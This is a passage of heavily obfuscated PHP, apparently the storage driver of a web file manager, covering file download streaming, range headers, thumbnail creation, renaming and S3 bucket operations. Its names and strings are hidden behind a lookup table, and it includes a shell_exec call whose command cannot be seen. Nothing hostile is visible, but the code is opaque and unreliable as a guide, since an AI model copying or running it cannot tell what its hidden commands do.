$´ÏÀû[103]) { return !1; } $³½Ó À³ = shell_exec($úÌúÀ©¾ . "\x20\42{$’ˆĞŠÍ¸}\x22"); $³½Ó À³ = str_replace($´ÏÀû[104], $´ÏÀû[12], $³½Ó À³); return substr($³½Ó À³, 0, 32); } public function link($è¡óÑÚœ) { return $è¡óÑÚœ; } public function fileOut($´ŠÇ–œÏ, $ÚÇÀöµ = false, $®í¸ŞÉ÷ = false, $Æ§ªğƒ = '') { $¬Şö±Ü× =& $_SERVER[Îûáû“ş]; $this->cacheMethod(null, null); if (!$´ŠÇ–œÏ || !$this->exist($´ŠÇ–œÏ)) { show_json(LNG($¬Şö±Ü×[105]), !1, $®í¸ŞÉ÷); } $“’æ÷‘ò = $this->getType() == $¬Şö±Ü×[106]; $Òü¥†â = $GLOBALS[$¬Şö±Ü×[6]][$¬Şö±Ü×[89]][$¬Şö±Ü×[107]][$¬Şö±Ü×[108]]; $ÜøÛ· = (double) $GLOBALS[$¬Şö±Ü×[6]][$¬Şö±Ü×[89]][$¬Şö±Ü×[107]][$¬Şö±Ü×[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ùñ·ÆÛÇ = $this->infoFull($´ŠÇ–œÏ); $İÁØÛ¹ = $ùñ·ÆÛÇ[$¬Şö±Ü×[76]]; $ê½Äè = gmdate($¬Şö±Ü×[110], $ùñ·ÆÛÇ[$¬Şö±Ü×[85]]); $´äšîã = $®í¸ŞÉ÷ ? $®í¸ŞÉ÷ : $this->iconvApp($ùñ·ÆÛÇ[$¬Şö±Ü×[32]]); $Õ¯Ì“óÈ = 0; $èÛõé = $İÁØÛ¹ - 1; $ÜĞºŞ«¢ = $this->ext($´äšîã); if (in_array($ÜĞºŞ«¢, array($¬Şö±Ü×[111], $¬Şö±Ü×[112], $¬Şö±Ü×[113], $¬Şö±Ü×[114]))) { $ÜĞºŞ«¢ = $¬Şö±Ü×[115]; } if (in_array($ÜĞºŞ«¢, array($¬Şö±Ü×[116]))) { $ÜĞºŞ«¢ = $¬Şö±Ü×[117]; } if (!$Æ§ªğƒ) { $Æ§ªğƒ = md5($ê½Äè . $this->hashSimple($´ŠÇ–œÏ)); } $Æ§ªğƒ = $¬Şö±Ü×[118] . $Æ§ªğƒ . $¬Şö±Ü×[118]; $ñ·Ò·ÒŠ = get_file_mime($ÜĞºŞ«¢); $ç³¨ïğ± = !0; $ç³¨ïğ± = isset($_GET[$¬Şö±Ü×[119]]) ? !1 : !0; if ($ÚÇÀöµ === !1 && !mime_support($ñ·Ò·ÒŠ)) { $ñ·Ò·ÒŠ = $¬Şö±Ü×[120]; } header($¬Şö±Ü×[121]); header($¬Şö±Ü×[122] . $ñ·Ò·ÒŠ); $÷¿¸ïô­ = rawurlencode($´äšîã); $÷¿¸ïô­ = $¬Şö±Ü×[118] . $÷¿¸ïô­ . $¬Şö±Ü×[123] . $÷¿¸ïô­; if ($ÚÇÀöµ) { header($¬Şö±Ü×[124]); header($¬Şö±Ü×[125] . $÷¿¸ïô­); } else { if ($ç³¨ïğ±) { header($¬Şö±Ü×[126] . $÷¿¸ïô­); } } header($¬Şö±Ü×[127] . gmdate($¬Şö±Ü×[110], time() + 3600 * 24 * 30) . $¬Şö±Ü×[128]); header($¬Şö±Ü×[129]); header($¬Şö±Ü×[130]); header($¬Şö±Ü×[131]); if (isset($_SERVER[$¬Şö±Ü×[132]]) && strtotime($_SERVER[$¬Şö±Ü×[132]]) == $ùñ·ÆÛÇ[$¬Şö±Ü×[85]]) { header($¬Şö±Ü×[133], !0, 304); die; } if (isset($_SERVER[$¬Şö±Ü×[134]]) && $_SERVER[$¬Şö±Ü×[134]] == $Æ§ªğƒ) { header($¬Şö±Ü×[135] . $Æ§ªğƒ, !0, 304); die; } header($¬Şö±Ü×[135] . $Æ§ªğƒ); header($¬Şö±Ü×[136] . $ê½Äè . $¬Şö±Ü×[128]); header($¬Şö±Ü×[137] . $´äšîã); header($¬Şö±Ü×[138]); header($¬Şö±Ü×[139] . $İÁØÛ¹); header($¬Şö±Ü×[140]); if (!$ÚÇÀöµ && $ÜĞºŞ«¢ == $¬Şö±Ü×[141]) { if ($İÁØÛ¹ > 1024 * 1024 * 5) { die; } $ìØÅúœº = $this->getContent($´ŠÇ–œÏ); $ìØÅúœº = Html::clearSVG($ìØÅúœº); header($¬Şö±Ü×[142] . strlen($ìØÅúœº)); echo $ìØÅúœº; die; } $ëÎİºò = strtolower($_SERVER[$¬Şö±Ü×[143]]); if ($“’æ÷‘ò && $ëÎİºò && $Òü¥†â) { if (strstr($ëÎİºò, $¬Şö±Ü×[144])) { header($¬Şö±Ü×[145] . $´ŠÇ–œÏ); } else { if (strstr($ëÎİºò, $¬Şö±Ü×[146])) { header($¬Şö±Ü×[147] . $´ŠÇ–œÏ); } else { if (strstr($ëÎİºò, $¬Şö±Ü×[148])) { header($¬Şö±Ü×[149] . $´ŠÇ–œÏ); } } } if ($ÜøÛ·) { header($¬Şö±Ü×[150] . $ÜøÛ·); } return; } if (isset($_SERVER[$¬Şö±Ü×[151]])) { if (preg_match($¬Şö±Ü×[152], $_SERVER[$¬Şö±Ü×[151]], $­È¶È®Ç)) { $Õ¯Ì“óÈ = intval($­È¶È®Ç[1]); $Õ¯Ì“óÈ = $Õ¯Ì“óÈ <= 0 ? 0 : ($Õ¯Ì“óÈ >= $èÛõé ? $èÛõé : $Õ¯Ì“óÈ); if (!empty($­È¶È®Ç[2])) { $µ±¬ï = intval($­È¶È®Ç[2]); $èÛõé = $µ±¬ï < $Õ¯Ì“óÈ ? $Õ¯Ì“óÈ : ($µ±¬ï >= $èÛõé ? $èÛõé : $µ±¬ï); } } header($¬Şö±Ü×[153]); header("\x43\157\156\164\145\x6e\x74\55\x52\x61\156\x67\x65\72\x20\x62\171\x74\x65\x73\x20{$Õ¯Ì“óÈ}\x2d{$èÛõé}\x2f" . $İÁØÛ¹); } else { header($¬Şö±Ü×[154]); } header($¬Şö±Ü×[155]); $ÑáÓ…û÷ = !0; if ($_SERVER[$¬Şö±Ü×[156]] == $¬Şö±Ü×[157] && $İÁØÛ¹ > 1204 * 1024 * 1024 * 2) { $ÑáÓ…û÷ = !1; } if ($ÑáÓ…û÷) { header($¬Şö±Ü×[158] . ($èÛõé - $Õ¯Ì“óÈ + 1)); } if ($_SERVER[$¬Şö±Ü×[159]] == $¬Şö±Ü×[160]) { return; } $¦ÈÛŞƒ« = 1024 * 100; $³Æª§â¦ = 0; if ($ÜøÛ·) { $³Æª§â¦ = intval(1000 * 1000 * ($¦ÈÛŞƒ« / $ÜøÛ·)); } while ($Õ¯Ì“óÈ <= $èÛõé) { $Şµ¥‚Íı = timeFloat(); check_abort(); $î‰™Û’Ø = $èÛõé - $Õ¯Ì“óÈ + 1; if ($î‰™Û’Ø <= $¦ÈÛŞƒ«) { $¦ÈÛŞƒ« = $î‰™Û’Ø; } echo $this->fileSubstr($´ŠÇ–œÏ, $Õ¯Ì“óÈ, $¦ÈÛŞƒ«); $Õ¯Ì“óÈ += $¦ÈÛŞƒ«; if ($¦ÈÛŞƒ« == $î‰™Û’Ø) { $Õ¯Ì“óÈ = $èÛõé + 1; } if ($³Æª§â¦) { $­ıª’ = intval(1000 * 1000 * (timeFloat() - $Şµ¥‚Íı)); $æ¨¯Õ§  = $³Æª§â¦ - $­ıª’; if ($æ¨¯Õ§  > 5) { usleep($æ¨¯Õ§ ); } } } } public function fileOutServer($„ñ´ïÕ, $éÈšêãà = false, $©áÏéÂú = false, $àÃıÄ¬ = '') { $this->fileOut($„ñ´ïÕ, $éÈšêãà, $©áÏéÂú, $àÃıÄ¬); } public function fileOutLink($‚û”Ò®û) { header($_SERVER[Îûáû“ş][161] . $‚û”Ò®û); die; } public function cacheMethod($”•š­œ, $Û«¤˜Í, $¦‘³å§Í = null) { $è£‚íŠĞ =& $_SERVER[Îûáû“ş]; static $ÃĞ„Ş€ = array(); $¥Ø½£‰ = $Û«¤˜Í ? ltrim($this->getPathOuter($Û«¤˜Í), $è£‚íŠĞ[8]) : $è£‚íŠĞ[12]; $şªëÃÈ¦ = $è£‚íŠĞ[162] . $”•š­œ . $è£‚íŠĞ[163] . rtrim($¥Ø½£‰, $è£‚íŠĞ[8]); if (is_null($”•š­œ)) { $ÃĞ„Ş€ = array(); return; } if (is_null($Û«¤˜Í)) { foreach ($ÃĞ„Ş€ as $şªëÃÈ¦ => $¾Ôİß) { if (!strstr($şªëÃÈ¦, $è£‚íŠĞ[162] . $”•š­œ . $è£‚íŠĞ[164])) { continue; } unset($ÃĞ„Ş€[$şªëÃÈ¦]); } return; } if (!is_null($¦‘³å§Í)) { $ÃĞ„Ş€[$şªëÃÈ¦] = $¦‘³å§Í; return; } $éƒêÔã› = isset($ÃĞ„Ş€[$şªëÃÈ¦]) ? $ÃĞ„Ş€[$şªëÃÈ¦] : null; if (!is_null($éƒêÔã›)) { return $éƒêÔã›; } $éƒêÔã› = $this->{$”•š­œ}($Û«¤˜Í); $ÃĞ„Ş€[$şªëÃÈ¦] = $éƒêÔã›; return $éƒêÔã›; } public function cacheMethodInfoSet($š¥Û¼òÜ, $¤ıæñÍò, $û×»ŞÀ = false) { $ûµãğã =& $_SERVER[Îûáû“ş]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ûµãğã[165], $š¥Û¼òÜ, $¤ıæñÍò); $this->cacheMethod($ûµãğã[166], $š¥Û¼òÜ, $¤ıæñÍò ? !1 : !0); if (is_array($û×»ŞÀ)) { $this->cacheMethod($ûµãğã[167], $š¥Û¼òÜ, $û×»ŞÀ); } } public function fileOutImage($Ö…ŞˆÇ–, $Ã‰ã˜¼ = 250) { $îÁ–¹Ì =& $_SERVER[Îûáû“ş]; set_timeout(); if (substr($Ö…ŞˆÇ–, 0, 4) == $îÁ–¹Ì[148]) { $this->fileOutLink($Ö…ŞˆÇ–); } $Ú²µàî = $this->info($Ö…ŞˆÇ–); $„á©ˆòÍ = $Ú²µàî[$îÁ–¹Ì[32]]; $±ä‘ä— = !1; if (isset($GLOBALS[$îÁ–¹Ì[168]]) && $GLOBALS[$îÁ–¹Ì[168]][$îÁ–¹Ì[84]] == $Ú²µàî[$îÁ–¹Ì[84]]) { $µÄ¿ú°´ = $GLOBALS[$îÁ–¹Ì[168]][$îÁ–¹Ì[169]]; if (!$Ú²µàî[$îÁ–¹Ì[170]]) { $Ú²µàî[$îÁ–¹Ì[170]] = $GLOBALS[$îÁ–¹Ì[168]]; } if (isset($µÄ¿ú°´[$îÁ–¹Ì[171]])) { if ($µÄ¿ú°´[$îÁ–¹Ì[171]] <= $Ã‰ã˜¼ && $µÄ¿ú°´[$îÁ–¹Ì[172]] <= $Ã‰ã˜¼) { $±ä‘ä— = !0; } } $„á©ˆòÍ = $Ú²µàî[$îÁ–¹Ì[170]][$îÁ–¹Ì[32]]; } if ($Ú²µàî[$îÁ–¹Ì[76]] <= 1024 * 50 || $±ä‘ä— || !function_exists($îÁ–¹Ì[173]) || $Ú²µàî[$îÁ–¹Ì[174]] == $îÁ–¹Ì[175]) { return $this->fileOut($Ö…ŞˆÇ–, !1, $„á©ˆòÍ); } if (isset($Ú²µàî[$îÁ–¹Ì[170]][$îÁ–¹Ì[176]])) { $ÙŞŸ§´Ÿ = $Ú²µàî[$îÁ–¹Ì[170]][$îÁ–¹Ì[176]]; } else { if (isset($Ú²µàî[$îÁ–¹Ì[170]][$îÁ–¹Ì[177]])) { $ÙŞŸ§´Ÿ = $Ú²µàî[$îÁ–¹Ì[170]][$îÁ–¹Ì[177]]; } } if (!$ÙŞŸ§´Ÿ) { $ÙŞŸ§´Ÿ = md5("{$Ú²µàî[$îÁ–¹Ì[32]]}\x5f{$Ú²µàî[$îÁ–¹Ì[84]]}\x5f{$Ú²µàî[$îÁ–¹Ì[76]]}\137{$Ã‰ã˜¼}"); } $àûµ¹ = "{$ÙŞŸ§´Ÿ}\x5f{$Ã‰ã˜¼}\x2e\160\156\147"; if (!($ÓïÕ‡‡¾ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $îÁ–¹Ì[178]))) { $İ¥¶œÉã = IO::mkdir(IO_PATH_SYSTEM_TEMP . $îÁ–¹Ì[179]); } else { $İ¥¶œÉã = KodIO::make($ÓïÕ‡‡¾); } if ($ÓïÕ‡‡¾ = IO::fileNameExist($İ¥¶œÉã, $àûµ¹)) { $í»Òï‰ã = KodIO::make($ÓïÕ‡‡¾); return IO::fileOut($í»Òï‰ã, !1, $„á©ˆòÍ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $í»Òï‰ã = DATA_THUMB . $àûµ¹; del_file($í»Òï‰ã); if (!@file_exists($í»Òï‰ã)) { $½ÅÏú™å = TEMP_FILES; if (!is_dir($½ÅÏú™å)) { mk_dir($½ÅÏú™å); } $¾ı›™°¤ = $½ÅÏú™å . $ÙŞŸ§´Ÿ . $îÁ–¹Ì[10] . $Ú²µàî[$îÁ–¹Ì[174]]; if (!@file_exists($¾ı›™°¤)) { $¾ı›™°¤ = $this->download($Ö…ŞˆÇ–, $¾ı›™°¤); } ImageThumb::createThumb($¾ı›™°¤, $í»Òï‰ã, $Ã‰ã˜¼, $Ã‰ã˜¼ * 10); } if (!file_exists($í»Òï‰ã) || filesize($í»Òï‰ã) < 100) { return @file_exists($¾ı›™°¤) ? IO::fileOut($¾ı›™°¤) : $this->fileOut($Ö…ŞˆÇ–); } if (!($®ªß†é = IO::move($í»Òï‰ã, $İ¥¶œÉã))) { return IO::fileOut($í»Òï‰ã); } del_file($í»Òï‰ã); IO::fileOut($®ªß†é); } public function fileOutImageServer($’Ò‘Ä£, $“İê‡ú§ = 250) { $this->fileOutImage($’Ò‘Ä£, $“İê‡ú§); } public function fileNameAuto($§•Â‡Üï, $À¯…¼„æ, $›¢ÇÆé” = REPEAT_RENAME, $¾Ô¤ñ¦ = false) { $•¾»¢øÕ =& $_SERVER[Îûáû“ş]; $µ½©èçä = $§•Â‡Üï === $•¾»¢øÕ[12] ? $À¯…¼„æ : rtrim($§•Â‡Üï, $•¾»¢øÕ[8]) . $•¾»¢øÕ[8] . $À¯…¼„æ; if ($›¢ÇÆé” == REPEAT_REPLACE || !$this->exist($µ½©èçä) || $¾Ô¤ñ¦ && $›¢ÇÆé” != REPEAT_RENAME_FOLDER) { return $À¯…¼„æ; } if ($›¢ÇÆé” == REPEAT_SKIP) { return !1; } $Éùş˜ŞÀ = $•¾»¢øÕ[10] . get_path_ext($À¯…¼„æ); $Éùş˜ŞÀ = $Éùş˜ŞÀ == $•¾»¢øÕ[10] || $¾Ô¤ñ¦ ? $•¾»¢øÕ[12] : $Éùş˜ŞÀ; $÷ÂÖÇé  = 1; $¯†µì¥Û = substr($À¯…¼„æ, 0, strlen($À¯…¼„æ) - strlen($Éùş˜ŞÀ)); $·¥ı–Ô“ = $¯†µì¥Û . "\x28{$÷ÂÖÇé }\x29{$Éùş˜ŞÀ}"; while ($this->exist(rtrim($§•Â‡Üï, $•¾»¢øÕ[8]) . $•¾»¢øÕ[8] . $·¥ı–Ô“)) { $·¥ı–Ô“ = $¯†µì¥Û . "\50{$÷ÂÖÇé }\51{$Éùş˜ŞÀ}"; $÷ÂÖÇé ++; } return $·¥ı–Ô“; } private function fileNameAutoList($¿¼¥ìİ‰, $¡æŒ§Ğû, $¢êÈŒ°Ó = false) { $Á‚€¸™ =& $_SERVER[Îûáû“ş]; $œ½¬ªÑŠ = $this->listPath($¿¼¥ìİ‰, !0); $œ½¬ªÑŠ = array_merge($œ½¬ªÑŠ[$Á‚€¸™[82]], $œ½¬ªÑŠ[$Á‚€¸™[83]]); $§Ş·¤¹µ = array_to_keyvalue($œ½¬ªÑŠ, $Á‚€¸™[12], $Á‚€¸™[32]); $­²ğÎë« = $Á‚€¸™[10] . get_path_ext($¡æŒ§Ğû); $­²ğÎë« = $­²ğÎë« == $Á‚€¸™[10] || $¢êÈŒ°Ó ? $Á‚€¸™[12] : $­²ğÎë«; $§Ëô‚’ = substr($¡æŒ§Ğû, 0, strlen($¡æŒ§Ğû) - strlen($­²ğÎë«)); $äüÖë–Å = $§Ëô‚’ . "\x28\x30\51{$­²ğÎë«}"; for ($®üÀ²» = 1; $®üÀ²» <= count($§Ş·¤¹µ) + 1; $®üÀ²»++) { $äüÖë–Å = $§Ëô‚’ . "\50{$®üÀ²»}\51{$­²ğÎë«}"; if (!in_array_not_case($äüÖë–Å, $§Ş·¤¹µ)) { return $äüÖë–Å; } } return $äüÖë–Å; } public function listAllFiles($ÄÕØÚ‰Õ, $ÇŸ»Ü†å) { $øú·°ß =& $_SERVER[Îûáû“ş]; if (empty($ÇŸ»Ü†å)) { return array(); } $‡÷¯¿ô = array_keys($ÇŸ»Ü†å); $æèÄÌÑô = array(); $ÄÕØÚ‰Õ = trim($ÄÕØÚ‰Õ, $øú·°ß[8]); foreach ($ÇŸ»Ü†å as $¦±¼Ş™º => $¶¾óÖ¾å) { $¨ÊÎ…ÚÌ = ltrim(substr(trim($¦±¼Ş™º, $øú·°ß[8]), strlen($ÄÕØÚ‰Õ)), $øú·°ß[8]); if (substr($¦±¼Ş™º, -1) == $øú·°ß[8]) { $¨ÊÎ…ÚÌ = rtrim($¨ÊÎ…ÚÌ, $øú·°ß[8]) . $øú·°ß[8]; } $æèÄÌÑô = array_merge($æèÄÌÑô, $this->slicePath($¨ÊÎ…ÚÌ)); } $ª‚÷¢¹„ = array(); foreach (array_unique($æèÄÌÑô) as $›Îûïª¼) { $úÍÉÖò = array($øú·°ß[84] => $this->getPathOuter($øú·°ß[8] . $ÄÕØÚ‰Õ . $øú·°ß[8] . $›Îûïª¼), $øú·°ß[75] => 1, $øú·°ß[76] => 0); if (substr($›Îûïª¼, -1) != $øú·°ß[8]) { $úÍÉÖò[$øú·°ß[75]] = 0; $¾å¡È¼İ = $this->getPath($ÄÕØÚ‰Õ . $øú·°ß[8] . $›Îûïª¼); if (isset($ÇŸ»Ü†å[$¾å¡È¼İ])) { $ÈŒÍœ®ß = $ÇŸ»Ü†å[$¾å¡È¼İ]; if (isset($ÈŒÍœ®ß[$øú·°ß[76]])) { $úÍÉÖò[$øú·°ß[76]] = intval($ÈŒÍœ®ß[$øú·°ß[76]]); } if (isset($ÈŒÍœ®ß[$øú·°ß[180]])) { $úÍÉÖò[$øú·°ß[85]] = intval($ÈŒÍœ®ß[$øú·°ß[180]]); } } } $ª‚÷¢¹„[] = $úÍÉÖò; } return $ª‚÷¢¹„; } public function slicePath($ìèàØË) { $üñ«¡Ç¸ =& $_SERVER[Îûáû“ş]; $‚‡Óóã‚ = explode($üñ«¡Ç¸[8], trim($ìèàØË, $üñ«¡Ç¸[8])); $Ê´©ïØÛ = 0; do { ++$Ê´©ïØÛ; $Ğè›ìéƒ[] = implode($üñ«¡Ç¸[8], array_slice($‚‡Óóã‚, 0, $Ê´©ïØÛ)) . $üñ«¡Ç¸[8]; } while ($Ê´©ïØÛ < count($‚‡Óóã‚)); $Ğè›ìéƒ[count($‚‡Óóã‚) - 1] = $ìèàØË; return $Ğè›ìéƒ; } public function getHost() { $®µĞàáÁ =& $_SERVER[Îûáû“ş]; $˜øÄÛò = parse_url(trim($this->domain, $®µĞàáÁ[8])); $Î“Úó˜ = isset($˜øÄÛò[$®µĞàáÁ[181]]) ? $˜øÄÛò[$®µĞàáÁ[181]] : http_type(); $Å±œ—½· = isset($˜øÄÛò[$®µĞàáÁ[182]]) ? $˜øÄÛò[$®µĞàáÁ[182]] : $˜øÄÛò[$®µĞàáÁ[84]]; if (isset($˜øÄÛò[$®µĞàáÁ[183]])) { $Å±œ—½· .= $®µĞàáÁ[4] . $˜øÄÛò[$®µĞàáÁ[183]]; } return $Î“Úó˜ . $®µĞàáÁ[184] . $Å±œ—½·; } public function pathEncode($ñ¼ƒÔİ’) { $¾„ùƒó‹ =& $_SERVER[Îûáû“ş]; return str_replace($¾„ùƒó‹[185], $¾„ùƒó‹[8], rawurlencode($ñ¼ƒÔİ’)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($óëúÇ¬æ) { set_timeout(); require_once SDK_DIR . $_SERVER[Îûáû“ş][186]; parent::__construct(); $this->_init($óëúÇ¬æ); } public function _init($¬°øÇå) { $this->config = $¬°øÇå; foreach ($¬°øÇå as $„éøá¤ñ => $Ûğğ†ºî) { if (isset($this->{$„éøá¤ñ})) { $this->{$„éøá¤ñ} = $Ûğğ†ºî; } } $this->endpoint = $¬°øÇå[$_SERVER[Îûáû“ş][187]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($éĞËë¦• = "\166\x34") { $this->signVer = $éĞËë¦•; $this->client->setSignatureVersion($éĞËë¦•); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $›÷°è¸« =& $_SERVER[Îûáû“ş]; $ËŸæÙÏÖ = $this->getBucketCors(); if (!$ËŸæÙÏÖ || !is_array($ËŸæÙÏÖ)) { return !1; } if ($ËŸæÙÏÖ[$›÷°è¸«[188]] != $›÷°è¸«[189] || $ËŸæÙÏÖ[$›÷°è¸«[190]] != $›÷°è¸«[189]) { return !1; } $‚§ÎŞˆĞ = array_map($›÷°è¸«[191], $ËŸæÙÏÖ[$›÷°è¸«[192]]); if (!is_array($‚§ÎŞˆĞ)) { $‚§ÎŞˆĞ = array(); } $¾Œ¦‹ = array($›÷°è¸«[193], $›÷°è¸«[194], $›÷°è¸«[195], $›÷°è¸«[196], $›÷°è¸«[197]); $Ğ  „ÄÅ = array_diff($¾Œ¦‹, $‚§ÎŞˆĞ); return empty($Ğ  „ÄÅ); } public function mkfile($Ÿ¸ãª, $ÔíÈš« = '', $Ú‡áá›Œ = REPEAT_RENAME) { $õ‚÷«‹ = $this->setContent($Ÿ¸ãª, $ÔíÈš«); if ($õ‚÷«‹ !== !1) { return $this->getPathOuter($Ÿ¸ãª); } return !1; } public function mkdir($…¡‰¡Óû, $Ÿ¾¬˜è§ = REPEAT_SKIP) { $íêØàÊå =& $_SERVER[Îûáû“ş]; if (empty($…¡‰¡Óû) && $…¡‰¡Óû !== $íêØàÊå[198]) { return !1; } if ($Ÿ¾¬˜è§ && $this->_isFolder($…¡‰¡Óû)) { return $this->getPathOuter($…¡‰¡Óû); } $ÀãˆúÛ‡ = $this->setContent($…¡‰¡Óû, $íêØàÊå[12], !0); if ($ÀãˆúÛ‡ !== !1) { return $this->getPathOuter($…¡‰¡Óû); } return !1; } public function copyFile($ò¨Öò«‡, $Ï³á½àµ, $õš†ãÖ = array()) { $Î—úğ¿ì =& $_SERVER[Îûáû“ş]; $¹‘æ£ = $this->objectMeta($ò¨Öò«‡); if (!$¹‘æ£) { return !1; } if ($¹‘æ£[$Î—úğ¿ì[76]] <= 1024 * 1024 * 200) { $âğ–²‰œ = $this->client->copyObject($this->bucket, $ò¨Öò«‡, $this->bucket, $Ï³á½àµ, $Î—úğ¿ì[199], $õš†ãÖ); } else { $âğ–²‰œ = $this->client->multiCopyObject($this->bucket, $ò¨Öò«‡, $this->bucket, $Ï³á½àµ, $õš†ãÖ); } $âğ–²‰œ = $âğ–²‰œ ? $this->getPathOuter($Ï³á½àµ) : !1; return $âğ–²‰œ; } public function moveFile($ûÄÑƒù, $¸çÌÜ„î) { if ($this->copyFile($ûÄÑƒù, $¸çÌÜ„î)) { $this->delFile($ûÄÑƒù); return $this->getPathOuter($¸çÌÜ„î); } return !1; } public function delFile($È—¯»á³) { return $this->client->deleteObject($this->bucket, $È—¯»á³); } public function delFolder($‘û»ÍÕ) { $õŞ‰ö =& $_SERVER[Îûáû“ş]; if (!$this->exist($‘û»ÍÕ)) { return !0; } $this->listItemCache = !1; $ƒş˜·İ˜ = $this->fileList($‘û»ÍÕ); $this->listItemCache = !0; $‹İ–óŠÕ = trim($‘û»ÍÕ, $õŞ‰ö[8]) . $õŞ‰ö[8]; if (!empty($‘û»ÍÕ) && $‘û»ÍÕ !== $õŞ‰ö[198] && !in_array($‹İ–óŠÕ, $ƒş˜·İ˜[$õŞ‰ö[82]])) { $ƒş˜·İ˜[$õŞ‰ö[82]][] = $‹İ–óŠÕ; } $ Š”Á¥å = $this->delByBatch($ƒş˜·İ˜[$õŞ‰ö[83]]); if (!$ Š”Á¥å) { return !1; } $ Š”Á¥å = $this->delByBatch($ƒş˜·İ˜[$õŞ‰ö[82]]); if (!$ Š”Á¥å) { return !1; } return $this->delFile($‹İ–óŠÕ); } private function delByBatch($®ûİÅó) { foreach (array_chunk($®ûİÅó, 1000) as $Ô›Í„–Ë) { $Å€ÛÓÏ = $this->client->deleteObjects($this->bucket, $Ô›Í„–Ë); if (!$Å€ÛÓÏ) { return !1; } } return !0; } public function rename($·îÏŞÅ, $òŠµââ§) { return $this->renameObject($·îÏŞÅ, $òŠµââ§); } public function listPath($’·®”†µ, $ã³‡ Š = false) { $ŸÖ¦¨‘ë =& $_SERVER[Îûáû“ş]; $™­øë‰ = $this->fileList($’·®”†µ, $ŸÖ¦¨‘ë[8], !0); foreach ($™­øë‰[$ŸÖ¦¨‘ë[82]] as $â©Œ¼¿‰ => $Ú±ï‹Ó) { $™­øë‰[$ŸÖ¦¨‘ë[82]][$â©Œ¼¿‰] = $this->folderInfo($Ú±ï‹Ó, $ã³‡ Š, $Ú±ï‹Ó); } foreach ($™­øë‰[$ŸÖ¦¨‘ë[83]] as $â©Œ¼¿‰ => $Ú±ï‹Ó) { $™­øë‰[$ŸÖ¦¨‘ë[83]][$â©Œ¼¿‰] = $this->fileInfo($Ú±ï‹Ó[$ŸÖ¦¨‘ë[32]], $ã³‡ Š, $Ú±ï‹Ó); } return $™­øë‰; } protected function infoChildren($ç¬«Åñ, &$¤÷Ú±¨¾) { $ÓÉÜœ–í =& $_SERVER[Îûáû“ş]; $“úíá´á = $this->fileList($ç¬«Åñ, $ÓÉÜœ–í[12], !0); $¤÷Ú±¨¾[$ÓÉÜœ–í[78]] += count($“úíá´á[$ÓÉÜœ–í[82]]); $¤÷Ú±¨¾[$ÓÉÜœ–í[77]] += count($“úíá´á[$ÓÉÜœ–í[83]]); foreach ($“úíá´á[$ÓÉÜœ–í[83]] as $˜‘Öğşë) { if (!$˜‘Öğşë || !$˜‘Öğşë[$ÓÉÜœ–í[76]]) { continue; } $¤÷Ú±¨¾[$ÓÉÜœ–í[76]] += $˜‘Öğşë[$ÓÉÜœ–í[76]]; } } private function fileInfo($Ô¸Ã”’, $·ßƒÁß = false, $Ë‰”­¤Ü = array()) { $ãŒéæ« =& $_SERVER[Îûáû“ş]; $—àé = array($ãŒéæ«[32] => $this->pathThis($Ô¸Ã”’), $ãŒéæ«[84] => $this->getPathOuter($Ô¸Ã”’), $ãŒéæ«[33] => $ãŒéæ«[200], $ãŒéæ«[174] => $this->ext($Ô¸Ã”’), $ãŒéæ«[76] => isset($Ë‰”­¤Ü[$ãŒéæ«[76]]) ? $Ë‰”­¤Ü[$ãŒéæ«[76]] : 0); if ($·ßƒÁß) { return $—àé; } $—àé[$ãŒéæ«[201]] = $—àé[$ãŒéæ«[85]] = 0; $—àé[$ãŒéæ«[202]] = $—àé[$ãŒéæ«[203]] = !0; if (empty($Ë‰”­¤Ü)) { $Ë‰”­¤Ü = $this->objectMeta($Ô¸Ã”’); if (!$Ë‰”­¤Ü) { return $—àé; } } if (isset($Ë‰”­¤Ü[$ãŒéæ«[180]])) { $—àé[$ãŒéæ«[85]] = $Ë‰”­¤Ü[$ãŒéæ«[180]]; } if (isset($Ë‰”­¤Ü[$ãŒéæ«[76]])) { $—àé[$ãŒéæ«[76]] = $Ë‰”­¤Ü[$ãŒéæ«[76]]; } return $—àé; } private function folderInfo($ÕØ¾ûÍ†, $øµ…ºÉÊ = false, $Áüë•ç· = array()) { $½©ã´İš =& $_SERVER[Îûáû“ş]; $Âë´É¸ç = array($½©ã´İš[32] => $this->pathThis($ÕØ¾ûÍ†), $½©ã´İš[84] => $this->getPathOuter($½©ã´İš[8] . $ÕØ¾ûÍ†), $½©ã´İš[33] => $½©ã´İš[75]); if ($øµ…ºÉÊ) { return $Âë´É¸ç; } $Âë´É¸ç[$½©ã´İš[201]] = $Âë´É¸ç[$½©ã´İš[85]] = 0; $Âë´É¸ç[$½©ã´İš[202]] = $Âë´É¸ç[$½©ã´İš[203]] = !0; if ($ÕØ¾ûÍ† == $½©ã´İš[12]) { return $Âë´É¸ç; } if (empty($Áüë•ç·)) { $Áüë•ç· = $this->objectMeta(trim($ÕØ¾ûÍ†, $½©ã´İš[8]) . $½©ã´İš[8]); } if (isset($Áüë•ç·[$½©ã´İš[180]])) { $Âë´É¸ç[$½©ã´İš[201]] = $Áüë•ç·[$½©ã´İš[180]]; } return $Âë´É¸ç; } private function fileList($ìè©¨š, $ÜšìİÔ = '', $ùÄı™×¡ = 0) { $çäõ¨ãÈ =& $_SERVER[Îûáû“ş]; $œ–›ö‘ = rtrim($ìè©¨š, $çäõ¨ãÈ[8]) . $çäõ¨ãÈ[8]; $’Ü®–Êß = $this->listObjs($œ–›ö‘, null, null, $ÜšìİÔ); if (!$’Ü®–Êß) { return array($çäõ¨ãÈ[82] => array(), $çäõ¨ãÈ[83] => array()); } $¤ğÒàÓ = $›¾ŸÅİÙ = array(); foreach ($’Ü®–Êß[$çäõ¨ãÈ[204]] as $ù©ô¸Ó) { $‡ôÕÊ“ = $ù©ô¸Ó[$çäõ¨ãÈ[32]]; if 